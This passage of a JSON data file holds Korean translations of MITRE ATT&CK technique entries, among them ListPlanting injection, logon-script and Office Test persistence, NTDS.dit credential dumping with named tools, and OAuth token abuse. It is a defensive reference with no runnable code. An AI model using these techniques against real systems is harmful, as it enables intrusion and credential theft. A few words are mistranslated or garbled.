    "description": "적대 세력은 악성 소프트웨어가 호출하는 API 기능을 숨기고 방어 분석을 저해하기 위해 이를 난독화한 후 동적으로 해결할 수 있습니다. 악성 소프트웨어는 일반적으로 프로세스, 파일 및 기타 시스템 아티팩트와 관련된 작업을 수행하기 위해 OS에서 제공하는 다양한 네이티브 API 기능을 사용합니다.\n\n악성 소프트웨어가 호출하는 API 기능은 페이로드 파일 내에 문자열과 같은 정적 아티팩트를 남길 수 있습니다. 방어 분석가는 또한 이진 파일이 어떤 기능을 실행할 수 있는지 수입 주소 테이블(IAT)이나 호출 코드를 동적으로 공유 모듈에 연결하는 데 도움이 되는 기타 구조를 통해 발견할 수 있습니다.\n\n정적 또는 기타 방어 분석을 피하기 위해, 적대 세력은 동적 API 해결을 사용하여 악성 소프트웨어의 특성과 기능을 숨길 수 있습니다. 소프트웨어 패킹과 유사하게 동적 API 해결은 파일 서명을 변경하고 악성 API 함수 호출을 난독화하여 실행 시간 동안 해결되고 호출될 때까지 유지할 수 있습니다.\n\n악성 소프트웨어의 API 기능 호출을 난독화하는 데 사용될 수 있는 다양한 방법이 있습니다. 예를 들어, 함수 이름의 해시는 일반적으로 악성 소프트웨어에 리터럴 문자열 대신 저장됩니다. 악성 소프트웨어는 이러한 해시(또는 다른 식별자)를 사용하여 `GetProcAddress()` 및 `LoadLibrary()`와 같은 함수를 사용하여 수동으로 링크 및 로딩 프로세스를 재현할 수 있습니다. 이러한 해시/식별자는 암호화 또는 기타 문자열 조작 기법을 사용하여 더 난독화될 수 있으며, 실행하는 동안 다양한 형태의 디옥변환/파일 또는 정보 해독이 필요할 수 있습니다.",
    "external_id": "T1027.007",
    "modified": "2022-08-23T18:32:46.899Z",
    "translated": true
  },
  {
    "title": "Remote Desktop Protocol",
    "description": "적대자들은 유효한 계정을 사용하여 원격 데스크톱 프로토콜(RDP)을 통해 컴퓨터에 로그인할 수 있습니다. 이후 적대자는 로그인한 사용자로서 행동을 수행할 수 있습니다.\n\n원격 데스크톱은 운영 체제에서 일반적인 기능입니다. 이를 통해 사용자는 원격 시스템의 데스크톱 그래픽 사용자 인터페이스와 상호작용하는 세션에 로그인할 수 있습니다. Microsoft는 원격 데스크톱 프로토콜(RDP)의 구현을 원격 데스크톱 서비스(RDS)라고 부릅니다.\n\n적대자들은 서비스가 활성화되어 있고 알려진 자격 증명에 대한 액세스를 허용하는 경우 RDP/RDS를 통해 원격 시스템에 연결하여 액세스를 확장할 수 있습니다. 적대자들은 RDP와 함께 사용할 자격 증명을 획득하기 위해 자격 증명 접근 기술을 사용할 가능성이 높습니다. 적대자들은 또한 지속성을 위해 접근성 기능이나 터미널 서비스 DLL과 함께 RDP를 사용할 수 있습니다.",
    "external_id": "T1021.001",
    "modified": "2023-08-07T14:23:30.265Z",
    "translated": true
  },
  {
    "title": "Logon Script (Windows)",
    "description": "적대 세력은 로그온 초기화 시 자동으로 실행되는 Windows 로그온 스크립트를 사용하여 지속성을 확립할 수 있습니다. Windows는 특정 사용자 또는 사용자 그룹이 시스템에 로그인할 때마다 로그온 스크립트를 실행할 수 있도록 허용합니다. 이는 스크립트의 경로를 <code>HKCU\\Environment\\UserInitMprLogonScript</code> 레지스트리 키에 추가함으로써 이루어집니다.\n\n적대 세력은 이러한 스크립트를 사용하여 단일 시스템에서 지속성을 유지할 수 있습니다. 로그온 스크립트의 접근 구성에 따라 로컬 자격 증명 또는 관리자 계정이 필요할 수 있습니다.",
    "external_id": "T1037.001",
    "modified": "2020-03-24T23:45:03.153Z",
    "translated": true
  },
  {
    "title": "ListPlanting",
    "description": "공격자는 목록 보기 제어를 악용하여 프로세스 기반 방어를 회피하고 권한을 상승시킬 수 있도록 악성 코드를 하이재킹된 프로세스에 주입할 수 있습니다. 리스트플랜팅(ListPlanting)은 별도의 실시간 프로세스의 주소 공간에서 임의 코드를 실행하는 방법입니다. 리스트플랜팅을 통해 실행된 코드는 합법적인 프로세스 아래에서 실행되기 때문에 보안 제품의 탐지를 회피할 수 있습니다.\n\n목록 보기 제어는 항목 컬렉션을 표시하기 위해 사용되는 사용자 인터페이스 창입니다. 애플리케이션의 목록 보기 설정에 대한 정보는 프로세스의 메모리에 있는 <code>SysListView32</code> 제어 안에 저장됩니다.\n\n리스트플랜팅(메시지 전송 \"샤터 공격\" 형태)은 목록 보기 제어를 사용하는 프로세스의 가상 주소 공간에 코드를 복사한 다음, 해당 코드를 나열된 항목의 정렬을 위한 사용자 정의 콜백으로 사용하는 방식으로 수행될 수 있습니다. 공격자는 먼저 대상 프로세스의 메모리 공간에 코드를 복사해야 하며, 이는 피해자 프로세스 창의 <code>SysListView32</code> 자식에 대한 핸들을 직접 얻는 방법(예: <code>FindWindow</code> 및/또는 <code>EnumWindows</code>와 같은 Windows API 호출)이나 다른 프로세스 주입 방법을 통해 수행될 수 있습니다.\n\n리스트플랜팅의 일부 변형은 대상 프로세스에 메모리를 할당하되, 매우 모니터링되는 <code>WriteProcessMemory</code> 함수를 피하기 위해 창 메시지를 사용하여 페이로드를 복사할 수 있습니다. 예를 들어, 공격자는 <code>PostMessage</code> 및/또는 <code>SendMessage</code> API 함수를 사용하여 <code>LVM_SETITEMPOSITION</code> 및 <code>LVM_GETITEMPOSITION</code> 메시지를 전송함으로써, 할당된 메모리로 페이로드를 2바이트씩 복사할 수 있습니다.\n\n마지막으로, 페이로드는 프로세스 창의 <code>SysListView32</code> 자식에게 <code>LVM_SORTITEMS</code> 메시지를 보내면서 트리거되며, 그 안에 새로운 할당된 버퍼의 페이로드가 <code>ListView_SortItems</code> 콜백으로 전달되고 실행됩니다.",
    "external_id": "T1055.015",
    "modified": "2024-08-14T17:34:33.948Z",
    "translated": true
  },
  {
    "title": "Hide Infrastructure",
    "description": "적대자는 자신의 C2 인프라를 숨기고 탐지를 피하기 위해 네트워크 트래픽을 조작할 수 있습니다. 이는 방어 도구의 트래픽을 식별 및 필터링하거나, 악성 도메인을 마스킹하여 자동 스캐닝 도구와 보안 연구자에게 실제 목적지를模糊화하는 등의 다양한 방법으로 수행될 수 있습니다. 또한 악성 아티팩트를 숨겨 탐지를 지연시키고 공격자의 인프라가 식별, 차단 또는 완전히 제거될 수 있는 가능성을 연장할 수 있습니다.\n\nC2 네트워크는 IP 주소를 가장하기 위해 프록시나 VPN을 사용할 수 있으며, 이는 공격자가 정상 네트워크 트래픽과 섞여 조건부 접근 정책이나 남용 방지 보호를 우회할 수 있게 합니다. 예를 들어, 공격자는 가상 사설 클라우드를 사용하여 피해자의 IP 주소 범위에 더 가깝게 자신의 IP 주소를 스푸핑할 수 있습니다. 이는 또한 출처 IP 주소의 지리적 위치에 의존하는 보안 조치를 우회할 수 있습니다.\n\n적대자는 또한 여러 가지 방법으로 방어 도구를 피하기 위해 네트워크 트래픽을 필터링하려고 시도할 수 있으며, 여기에는 일반적인 사고 대응자나 보안 장치 사용자 에이전트를 차단 또는 리디렉션하는 것이 포함됩니다. IP 및 지리적 경계 기반으로 트래픽을 필터링하면 자동 샌드박스나 연구자의 활동을 피할 수도 있습니다.\n\nC2 인프라를 숨기는 것도 인프라 획득 및 인프라 타당성 등의 자원 개발 활동에 의해 지원될 수 있습니다. 예를 들어, 널리 신뢰받는 호스팅 서비스나 URL 단축 제공자, 마케팅 서비스와 같은 도메인을 사용하면 공격자가 무해한 콘텐츠를 제공하고, 특정 조건이 충족되면 피해자를 악성 웹 페이지나 인프라로 리디렉션할 수 있게 합니다.",
    "external_id": "T1665",
    "modified": "2024-04-18T19:44:00.603Z",
    "translated": true
  },
  {
    "title": "Domain or Tenant Policy Modification",
    "description": "적대자는 방어를 피하거나 중앙에서 관리되는 환경에서 권한을 상승시키기 위해 도메인 또는 아이덴티티 테넌트의 구성 설정을 수정할 수 있습니다. 이러한 서비스는 장치 및 계정과 같은 아이덴티티 리소스를 중앙에서 관리할 수 있는 방법을 제공하며, 종종 신뢰 관계, 아이덴티티 동기화 또는 아이덴티티 연합과 같은 도메인 간 또는 테넌트 간에 적용될 수 있는 구성 설정을 포함합니다.\n\n도메인 또는 테넌트 설정 수정에는 Microsoft Active Directory(AD)에서 도메인 그룹 정책 개체(GPO)를 변경하거나 도메인에 대한 신뢰 설정, 특히 도메인 또는 테넌트 간의 연합 신뢰 관계를 변경하는 것이 포함될 수 있습니다.\n\n충분한 권한이 있는 경우 적대자는 도메인 또는 테넌트 정책 설정을 수정할 수 있습니다. 이러한 서비스의 구성 설정은 많은 수의 아이덴티티 리소스에 적용되므로, 이러한 남용으로 인해 발생할 수 있는 잠재적인 공격과 악의적인 결과가 매우 많습니다. 이러한 남용의 예로는 다음이 포함됩니다:  \n\n* GPO를 수정하여 도메인 환경의 컴퓨터에 악성 작업을 푸시하는 것\n* 도메인 신뢰를 수정하여 적대자가 제어하는 도메인을 포함시키는 것, 이를 통해 적대자가 보안 토큰을 위조해 피해자 도메인 리소스에서 수용되도록 하는 것\n* AD 환경 내에서 구성 설정을 변경하여 악성 도메인 컨트롤러를 구현하는 것\n* 새로운 적대자가 제어하는 연합 아이덴티티 공급자를 아이덴티티 테넌트에 추가하여 적대자가 피해자 테넌트에서 관리하는 모든 사용자로 인증할 수 있게 하는 것\n\n적대자는 도메인 또는 테넌트 정책을 일시적으로 수정하고, 악의적인 행동을 수행한 후, 의심스러운 지표를 제거하기 위해 변경 사항을 되돌릴 수 있습니다.",
    "external_id": "T1484",
    "modified": "2024-10-15T15:55:32.946Z",
    "translated": true
  },
  {
    "title": "XSL Script Processing",
    "description": "적대자는 XSL 파일 내에 스크립트를 삽입하여 애플리케이션 제어를 우회하고 코드 실행을 모호하게 만들 수 있습니다. 확장 스타일시트 언어(XSL) 파일은 XML 파일 내 데이터의 처리 및 렌더링을 설명하는 데 일반적으로 사용됩니다. 복잡한 작업을 지원하기 위해 XSL 표준은 다양한 언어로 된 삽입 스크립팅을 지원합니다.\n\n적대자는 이 기능을 악용하여 애플리케이션 제어를 우회하면서 임의의 파일을 실행할 수 있습니다. Microsoft의 일반 변환 유틸리티 바이너리(msxsl.exe)는 로컬 또는 원격(XSL 파일에 참조된 URL) XSL 파일 내에 삽입된 악성 JavaScript를 실행하는 데 사용할 수 있습니다. msxsl.exe는 기본적으로 설치되지 않기 때문에, 적대자는 파일을 드롭할 때 이를 패키징해야 할 가능성이 높습니다. msxsl.exe는 XML 소스 파일과 XSL 스타일시트라는 두 가지 주요 인수를 사용합니다. XSL 파일이 유효한 XML이므로, 적대자는 동일한 XSL 파일을 두 번 호출할 수 있습니다. msxsl.exe를 사용할 때 적대자는 XML/XSL 파일에 임의의 파일 확장자를 부여할 수도 있습니다.\n\n이 기술의 또 다른 변형인 “Squiblytwo”는 XSL 파일 내에서 JScript 또는 VBScript를 호출하기 위해 Windows 관리 도구를 사용하는 것입니다. 이 기술은 로컬/원격 스크립트를 실행할 수 있으며, 신뢰할 수 있는 내장 Windows 도구를 활용합니다. 적대자는 /FORMAT 스위치를 사용할 경우 Windows 관리 도구의 모든 별칭을 악용할 수 있습니다.",
    "external_id": "T1220",
    "modified": "2024-09-12T19:40:12.337Z",
    "translated": true
  },
  {
    "title": "Scan Databases",
    "description": "적대자들은 목표 타겟팅에 활용할 수 있는 피해자에 대한 정보를 찾기 위해 공개 스캔 데이터베이스를 검색할 수 있습니다. 다양한 온라인 서비스는 인터넷 스캔/조사 결과를 지속적으로 게시하며, 종종 활성 IP 주소, 호스트명, 열린 포트, 인증서, 심지어 서버 배너와 같은 정보를 수집합니다.\n\n적대자들은 actionable 정보를 수집하기 위해 스캔 데이터베이스를 검색할 수 있습니다. 위협 행위자는 이러한 서비스로부터 정보를 수집하기 위해 온라인 자원 및 조회 도구를 사용할 수 있습니다. 적대자들은 이미 특정된 목표에 대한 정보를 찾으려 하거나, 이러한 데이터 세트를 사용하여 성공적인 침해를 위한 기회를 발견할 수 있습니다. 이러한 출처에서 얻은 정보는 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 구축하거나 초기 접근을 확보하는 기회를 제공할 수 있습니다.",
    "external_id": "T1596.005",
    "modified": "2021-04-15T03:49:49.260Z",
    "translated": true
  },
  {
    "title": "Hidden Files and Directories",
    "description": "공격자는 감지 메커니즘을 회피하기 위해 파일과 디렉터리를 숨길 수 있습니다. 일반 사용자가 시스템의 특별한 파일을 실수로 변경하지 못하도록 대부분의 운영 체제는 '숨김' 파일의 개념을 가지고 있습니다. 이러한 파일은 사용자가 GUI를 통해 파일 시스템을 탐색할 때나 명령 줄에서 일반 명령을 사용할 때 표시되지 않습니다. 사용자는 GUI의 일련의 프롬프트나 명령 줄 스위치를 통해 숨김 파일을 표시하라고 명시적으로 요청해야 합니다.\n\nLinux와 Mac에서는 사용자가 파일 또는 폴더 이름의 첫 번째 문자로 \"점(.)\"을 추가하여 특정 파일을 숨김으로 표시할 수 있습니다. 점(.)으로 시작하는 파일과 폴더는 기본적으로 Finder 애플리케이션과 표준 명령 줄 유틸리티인 \"ls\"에서 보이지 않게 설정됩니다. 사용자는 이러한 파일을 볼 수 있도록 설정을 변경해야 합니다.\n\nmacOS의 파일은 또한 UF_HIDDEN 플래그로 표시할 수 있어 Finder.app에서는 보이지 않지만 Terminal.app에서는 볼 수 있게 됩니다. Windows에서는 사용자가 attrib.exe 바이너리를 사용하여 특정 파일을 숨김으로 표시할 수 있습니다. 많은 응용 프로그램이 이러한 숨겨진 파일과 폴더를 생성하여 정보를 저장함으로써 사용자의 작업 공간을 혼잡하게 만들지 않도록 합니다. 예를 들어, SSH 유틸리티는 사용자의 알려진 호스트와 키가 포함된 숨김 .ssh 폴더를 만듭니다.\n\n공격자는 이를 이용해 시스템의 어디에나 파일과 폴더를 숨길 수 있으며, 숨김 파일 조사를 포함하지 않는 일반 사용자나 시스템 분석을 회피할 수 있습니다.",
    "external_id": "T1564.001",
    "modified": "2020-03-29T22:32:25.985Z",
    "translated": true
  },
  {
    "title": "Create Snapshot",
    "description": "적대자는 클라우드 계정 내에서 스냅샷이나 데이터 백업을 생성하여 방어를 회피할 수 있습니다. 스냅샷은 가상 머신(VM), 가상 하드 드라이브 또는 볼륨과 같은 기존 클라우드 컴퓨팅 구성 요소의 시점 복사본입니다. 적대자는 권한을 활용하여 스냅샷을 생성함으로써 기존 컴퓨팅 서비스 인프라에 대한 접근을 차단하는 제한을 우회할 수 있습니다. \n\n적대자는 클라우드 인스턴스를 생성하고, 해당 인스턴스에 하나 이상의 생성된 스냅샷을 연결한 다음, 적대자가 생성된 인스턴스에 접근할 수 있도록 허용하는 정책을 적용할 수 있습니다. 예를 들어, 이렇게 하면 인바운드 및 아웃바운드 SSH 접근을 허용하는 방화벽 정책이 적용될 수 있습니다.",
    "external_id": "T1578.001",
    "modified": "2024-10-15T15:53:44.870Z",
    "translated": true
  },
  {
    "title": "Determine Physical Locations",
    "description": "적대자들은 표적을 설정하는 데 사용될 수 있는 피해자의 물리적 위치를 수집할 수 있습니다. 표적 조직의 물리적 위치에 대한 정보는 주요 자원과 인프라가 위치한 장소를 포함하여 다양한 세부 정보를 포함할 수 있습니다. 물리적 위치는 또한 피해자가 운영하는 법적 관할구역 및/또는 당국을 나타낼 수 있습니다.\n\n적대자들은 이 정보를 다양한 방법으로 수집할 수 있으며, 그 중 하나는 직접적인 정보 수집입니다. 표적 조직의 물리적 위치는 온라인 또는 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수도 있습니다. 이 정보를 수집하면 다른 형태의 정찰 기회를 드러낼 수 있으며, 작전 자원 구축, 능력 개발 또는 획득, 초기 접근 등을 위한 기반이 될 수 있습니다.",
    "external_id": "T1591.001",
    "modified": "2021-08-27T15:37:09.025Z",
    "translated": true
  },
  {
    "title": "Office Test",
    "description": "적들은 Microsoft Office \"Office Test\" 레지스트리 키를 악용하여 손상된 시스템에서 지속성을 확보할 수 있습니다. Office 애플리케이션이 시작될 때마다 실행될 임의의 DLL을 사용자에게 지정할 수 있는 Office Test 레지스트리 위치가 존재합니다. 이 레지스트리 키는 Microsoft가 Office 애플리케이션을 개발할 때 테스트 및 디버깅 목적으로 DLL을 로드하는 데 사용하는 것으로 여겨집니다. 이 레지스트리 키는 Office 설치 시 기본적으로 생성되지 않습니다.\n\nOffice Test 기능에는 사용자 및 전역 레지스트리 키가 존재합니다.\n\n적들은 이 레지스트리 키를 추가하고 Word나 Excel과 같은 Office 애플리케이션이 시작될 때마다 실행될 악성 DLL을 지정할 수 있습니다.",
    "external_id": "T1137.002",
    "modified": "2024-10-15T16:01:48.325Z",
    "translated": true
  },
  {
    "title": "Develop Capabilities",
    "description": "적대자는 타겟팅 중 사용할 수 있는 능력을 구축할 수 있습니다. 능력을 구매하거나 무료로 다운로드하거나 도용하는 대신, 적대자는 내부에서 자체적으로 능력을 개발할 수 있습니다. 이는 개발 요구 사항을 식별하고 악성 코드, 취약점 공격, 자체 서명된 인증서와 같은 솔루션을 구축하는 과정입니다. 적대자는 적대자인 생애 주기의 여러 단계에 걸쳐 자신의 작전을 지원하기 위해 능력을 개발할 수 있습니다.\n\n정당한 개발 노력과 마찬가지로, 능력을 개발하는 데 필요한 다양한 기술 세트가 요구될 수 있습니다. 필요한 기술은 내부에 있을 수도 있고, 외부에 계약할 필요가 있을 수도 있습니다. 계약자를 사용하면 적대자의 개발 능력을 확장하는 것으로 간주될 수 있으며, 이 경우 적대자가 요구 사항을 형성하는 역할을 하고 해당 능력에 대한 특정 정도의 독점성을 유지해야 합니다.",
    "external_id": "T1587",
    "modified": "2024-10-15T16:31:17.270Z",
    "translated": true
  },
  {
    "title": "NTDS",
    "description": "적대자는 자격 증명 정보를 도용하고 장치, 사용자 및 접근 권한과 같은 도메인 구성원에 대한 기타 정보를 얻기 위해 Active Directory 도메인 데이터베이스에 접근하거나 복사본을 생성하려 할 수 있습니다. 기본적으로 NTDS 파일(NTDS.dit)은 도메인 컨트롤러의 <code>%SystemRoot%\\NTDS\\Ntds.dit</code>에 위치합니다.\n\n적대자는 활성 도메인 컨트롤러에서 NTDS 파일을 찾는 것 외에도 동일하거나 유사한 정보를 포함하는 백업을 검색할 수 있습니다.\n\n다음 도구와 기술을 사용하여 NTDS 파일과 전체 Active Directory 해시의 내용을 나열할 수 있습니다.\n\n* 볼륨 섀도 복사\n* secretsdump.py\n* 내장 Windows 도구인 ntdsutil.exe 사용\n* Invoke-NinjaCopy",
    "external_id": "T1003.003",
    "modified": "2023-07-28T14:41:38.908Z",
    "translated": true
  },
  {
    "title": "SNMP (MIB Dump)",
    "description": "적대자는 Simple Network Management Protocol(SNMP)를 사용하여 관리되는 네트워크에서 귀중한 정보를 수집하고/또는 채굴하기 위해 관리 정보 베이스(MIB)를 표적할 수 있습니다.\n\nMIB는 SNMP를 통해 객체 식별자(OID) 형태로 접근할 수 있는 변수 정보를 저장하는 구성 저장소입니다. 각 OID는 읽거나 설정할 수 있는 변수를 식별하며, 이러한 변수를 원격으로 수정하여 구성 변경과 같은 능동적인 관리 작업을 허용합니다. SNMP는 관리자에게 시스템 정보, 하드웨어 설명, 물리적 위치 및 소프트웨어 패키지에 대한 깊은 통찰력을 제공할 수 있습니다. MIB는 또한 실행 중인 구성, 라우팅 테이블 및 인터페이스 세부정보와 같은 장치 운영 정보를 포함할 수 있습니다.\n\n적대자는 SNMP 쿼리를 사용하여 SNMP 관리 장치에서 MIB 내용을 직접 수집할 수 있으며, 이를 통해 적대자는 네트워크 정보를 수집하고 네트워크 맵을 구축하여 향후 목표 공격을 용이하게 할 수 있습니다.",
    "external_id": "T1602.001",
    "modified": "2020-10-22T01:54:22.812Z",
    "translated": true
  },
  {
    "title": "Malicious Link",
    "description": "적대자는 악성 링크를 클릭하도록 사용자를 유도하여 실행 권한을 얻을 수 있습니다. 사용자는 코드 실행으로 이어지는 링크를 클릭하도록 유도하는 사회적 공학에 노출될 수 있습니다. 이러한 사용자 행동은 일반적으로 특정 링크를 통해 관찰됩니다. 링크 클릭은 또한 웹 브라우저나 응용 프로그램의 취약점을 이용한 실행 기법으로 이어질 수 있습니다. 링크는 또한 사용자가 실행이 필요한 파일을 다운로드하도록 유도할 수 있습니다.",
    "external_id": "T1204.001",
    "modified": "2024-09-10T16:40:03.786Z",
    "translated": true
  },
  {
    "title": "Application Access Token",
    "description": "적대자는 도난당한 애플리케이션 접근 토큰을 사용하여 일반적인 인증 프로세스를 우회하고 원격 시스템의 제한된 계정, 정보 또는 서비스에 접근할 수 있습니다. 이러한 토큰은 일반적으로 사용자나 서비스로부터 도난당하며, 로그인 자격 증명 대신 사용됩니다.\n\n애플리케이션 접근 토큰은 사용자나 서비스의 이름으로 승인된 API 요청을 수행하는 데 사용되며, 클라우드, 컨테이너 기반 애플리케이션 및 서비스형 소프트웨어(SaaS)에서 리소스에 접근하는 데 일반적으로 사용됩니다.\n\nOAuth는 사용자가 시스템에 접근할 수 있도록 토큰을 발행하는 일반적으로 구현되는 프레임워크 중 하나입니다. 이러한 프레임워크는 사용자 확인 및 사용자가 수행할 수 있는 작업을 결정하기 위해 협력적으로 사용됩니다. 신원이 확립되면, 토큰은 실제 사용자 자격 증명을 전달하지 않고도 작업을 승인할 수 있습니다. 따라서 토큰이 침해되면 적대자가 악성 애플리케이션을 통해 다른 사이트의 리소스에 접근할 수 있습니다.\n\n예를 들어, 클라우드 기반 이메일 서비스의 경우, OAuth 접근 토큰이 악성 애플리케이션에 부여되면 \"리프레시\" 토큰이 지급되어 백그라운드 접근이 가능할 경우 사용자 계정 기능에 장기적으로 접근할 수 있습니다. OAuth 접근 토큰을 통해 적대자는 사용자 권한을 부여받은 REST API를 사용하여 이메일 검색 및 연락처 열거와 같은 기능을 수행할 수 있습니다.\n\n침해된 접근 토큰은 다른 서비스를 침해하는 초기 단계로 사용될 수 있습니다. 예를 들어, 토큰이 피해자의 주요 이메일에 접근할 수 있도록 한다면, 적대자는 잊어버린 비밀번호 절차를 유도하여 대상이 가입한 모든 다른 서비스에 대한 접근을 확장할 수 있습니다. AWS 및 GCP 환경에서는 적대자가 다른 사용자 계정의 권한으로 단기 접근 토큰 요청을 유도할 수 있습니다. 그런 다음 적대자는 이 토큰을 사용하여 원래 계정이 수행할 수 없는 데이터 요청이나 작업을 수행할 수 있습니다. 이 기능에 대한 권한이 잘못 구성된 경우 - 예를 들어, 특정 계정에 대한 토큰 요청을 모든 사용자에게 허용하는 경우 - 적대자는 클라우드 계정에 초기 접근하거나 자신의 권한을 상승시킬 수 있습니다.\n\n토큰을 통한 직접 API 접근은 두 번째 인증 요소의 효과를 무효화하며 비밀번호 변경과 같은 직관적인 대처 방법에 면역이 될 수 있습니다. 예를 들어, AWS 환경에서 사용자 AWS API 자격 증명을 침해한 적대자는 `sts:GetFederationToken` API 호출을 사용하여 연합 사용자 세션을 생성할 수 있으며, 이는 원래 사용자와 동일한 권한을 가지지만 원래 사용자 자격 증명이 비활성화되더라도 지속될 수 있습니다. 또한 API 채널을 통한 접근 남용은 서비스 제공자의 측면에서도 감지하기 어려울 수 있으며, 접근이 여전히 합법적인 작업 흐름과 잘 일치할 수 있습니다.",
    "external_id": "T1550.001",
    "modified": "2024-10-15T15:38:11.583Z",
    "translated": true
  },
  {
    "title": "LSASS Driver",
    "description": "적대자는 손상된 시스템에서 지속성을 확보하기 위해 LSASS 드라이버를 수정하거나 추가할 수 있습니다. 윈도우 보안 하위 시스템은 컴퓨터 또는 도메인에 대한 보안 정책을 관리하고 시행하는 구성 요소 집합입니다. 로컬 보안 기관(LSA)은 로컬 보안 정책과 사용자 인증을 담당하는 주요 구성 요소입니다. LSA에는 여러 가지 다른 보안 기능과 관련된 다수의 동적 링크 라이브러리(DLL)가 포함되어 있으며, 이 모든 것은 LSA 서브시스템 서비스(LSASS) lsass.exe 프로세스의 컨텍스트에서 실행됩니다.\n\n적대자는 지속성을 확보하기 위해 LSASS 드라이버를 목표로 할 수 있습니다. 불법적인 드라이버를 교체하거나 추가함으로써, 적대자는 LSA 작업을 사용하여 악성 페이로드를 지속적으로 실행할 수 있습니다.",
    "external_id": "T1547.008",
    "modified": "2022-04-20T16:34:43.405Z",
    "translated": true
  },
  {
    "title": "Service Execution",
    "description": "적대자는 Windows 서비스 제어 관리자를 악용하여 악성 명령이나 페이로드를 실행할 수 있습니다. Windows 서비스 제어 관리자(<code>services.exe</code>)는 서비스를 관리하고 조작하기 위한 인터페이스입니다. 서비스 제어 관리자는 GUI 구성 요소와 <code>sc.exe</code>와 같은 시스템 유틸리티를 통해 사용자에게 접근할 수 있습니다.\n\n<code>PsExec</code>를 사용하여 서비스 제어 관리자 API를 통해 생성된 임시 Windows 서비스를 통해 명령이나 페이로드를 실행할 수도 있습니다. <code>PsExec</code>와 <code>sc.exe</code>와 같은 도구는 원격 서버를 인자로 받아들일 수 있으며 원격 실행을 수행하는 데 사용될 수 있습니다.\n\n적대자는 이러한 메커니즘을 활용하여 악성 콘텐츠를 실행할 수 있습니다. 이는 새로 생성된 서비스나 수정된 서비스를 실행함으로써 가능합니다. 이 기술은 서비스 지속성 또는 권한 상승 동안 [Windows Service](https://attack.mitre.org/techniques/T1543/003)와 함께 사용되는 실행 방법입니다.",
    "external_id": "T1569.002",
    "modified": "2024-10-15T16:41:40.247Z",
    "translated": true
  },
  {
    "title": "Cloud Accounts",
    "description": "클라우드 환경의 유효한 계정은 적들이 초기 접근, 지속성, 권한 상승 또는 방어 회피를 달성하기 위한 행동을 수행하도록 허용할 수 있습니다. 클라우드 계정은 조직에 의해 생성되고 구성된 계정으로, 사용자, 원격 지원, 서비스 또는 클라우드 서비스 제공업체 또는 SaaS 응용 프로그램 내 자원 관리를 위해 사용됩니다. 클라우드 계정은 클라우드에만 존재할 수 있으며, 대안으로 온프레미스 시스템과 클라우드 간의 동기화 또는 Windows Active Directory와 같은 다른 신원 소스와의 연합을 통해 하이브리드 방식으로 연결될 수 있습니다.\n\n서비스 또는 사용자 계정은 적들이 환경에 접근하기 위해 무차별 대입 공격, 피싱 또는 다양한 다른 수단을 통해 목표로 삼을 수 있습니다. 연합되거나 동기화된 계정은 적이 온프레미스 시스템과 클라우드 환경 모두에 영향을 미치는 경로가 될 수 있습니다. 예를 들어, 공유된 자격 증명을 활용하여 원격 서비스에 로그인할 수 있습니다. 고급 권한을 가진 클라우드 계정은 연합되었든, 동기화되었든, 클라우드 전용이든 상관없이 SaaS 기반 소프트웨어 배포 도구를 활용하여 하이브리드 장치에서 명령을 실행함으로써 온프레미스 환경으로 피벗할 수 있습니다.\n\n적은 손상된 클라우드 계정에서 지속성을 유지하기 위해 장기적인 추가 클라우드 자격 증명을 생성할 수 있습니다. 이러한 자격 증명은 다단계 인증과 같은 보안 통제를 우회하는 데도 사용될 수 있습니다.\n\n클라우드 계정 또한 환경 내에서 다양한 수단을 통해 임시 상승된 클라우드 접근 권한이나 기타 권한을 가질 수 있습니다. 역할 할당이나 역할 가정 정책의 잘못된 구성은 적이 이러한 메커니즘을 사용하여 계정의 의도된 범위를 넘어서는 권한을 활용할 수 있게 할 수 있습니다. 이러한 과도한 권한을 가진 계정은 클라우드 API 또는 다른 방법을 통해 온라인 스토리지 계정 및 데이터베이스에서 민감한 데이터를 수집하는 데 사용될 수 있습니다.",
    "external_id": "T1078.004",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Environmental Keying",
    "description": "대적자는 방어를 피하고 특정 대상 환경에서 실행을 제한하기 위해 악성 코드의 페이로드 또는 다른 기능을 환경적으로 키를 설정할 수 있습니다. 환경 키 설정은 암호화를 사용하여 공격자가 제공한 환경 특정 조건에 따라 실행 또는 작업을 제한합니다. 이러한 환경 키 설정은 특정 컴퓨팅 환경의 특정 유형 값으로부터 암호화/복호화 키를 도출하기 위해 암호 기술을 활용하는 실행 가드레일의 구현입니다.\n\n값은 대상 특정 요소에서 파생될 수 있으며 암호화된 페이로드의 복호화 키를 생성하는 데 사용될 수 있습니다. 대상 특정 값은 특정 네트워크 공유, 물리적 장치, 소프트웨어/소프트웨어 버전, 파일, 결합된 Active Directory 도메인, 시스템 시간 및 로컬/외부 IP 주소에서 파생될 수 있습니다. 대상 특정 환경 값으로부터 복호화 키를 생성함으로써, 환경 키 설정은 샌드박스 탐지, 안티바이러스 탐지, 정보 군중 조달 및 리버스 엔지니어링을 어렵게 만들 수 있습니다. 이러한 어려움은 사건 대응 프로세스를 지연시키고 대적자가 그들의 전술, 기술 및 절차(TTP)를 숨기는데 도움을 줄 수 있습니다.\n\n은폐된 파일 또는 정보와 유사하게, 대적자는 환경 키 설정을 사용하여 그들의 TTP를 보호하고 탐지를 회피할 수 있습니다. 환경 키 설정은 대상 특정 값을 사용하여 실행 전에 페이로드를 복호화할 암호화된 페이로드를 대상에 전달하는 데 사용될 수 있습니다. 대상 특정 값을 사용하여 페이로드를 복호화함으로써 대적자는 페이로드와 함께 복호화 키를 패키징하거나 잠재적으로 모니터링되는 네트워크 연결을 통해 전송하는 것을 피할 수 있습니다. 대상 특정 값을 수집하는 기술에 따라 암호화된 페이로드의 리버스 엔지니어링이 매우 어려울 수 있습니다. 이는 의도하지 않은 환경에서의 기능 노출을 방지하는 데 사용될 수 있습니다.\n\n다른 실행 가드레일과 마찬가지로, 환경 키 설정은 의도하지 않게 침해되거나 운영되지 않을 환경에서 기능 노출을 방지하는 데 사용될 수 있습니다. 이러한 활동은 일반적인 가상화/샌드박스 회피와는 구별됩니다. 가상화/샌드박스 회피는 알려진 샌드박스 값을 확인하고 일치하지 않을 경우에만 실행을 계속하는 경우가 있을 수 있지만, 환경 키 설정은 복호화 및 후속 실행이 성공하기 위해 일치해야 하는 예상되는 대상 특정 값을 확인하는 것을 포함합니다.",
    "external_id": "T1480.001",
    "modified": "2022-05-04T14:52:51.290Z",
    "translated": true
  },
  {
    "title": "Fallback Channels",
